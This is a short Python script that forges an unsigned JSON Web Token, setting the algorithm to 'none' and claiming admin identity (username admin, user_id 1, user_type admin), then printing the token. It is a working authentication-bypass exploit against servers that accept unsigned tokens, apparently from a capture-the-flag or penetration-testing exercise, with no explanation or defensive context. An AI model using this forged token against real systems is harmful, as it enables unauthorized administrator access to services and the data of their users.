import base64
import json
header = {"alg":"none","typ":"JWT"}
payload = {"username":"admin","user_id":1,"user_type":"admin"}
def b64url(b):
    return base64.urlsafe_b64encode(json.dumps(b).encode()).decode().rstrip("=")
token = f"{b64url(header)}.{b64url(payload)}."
print(token)

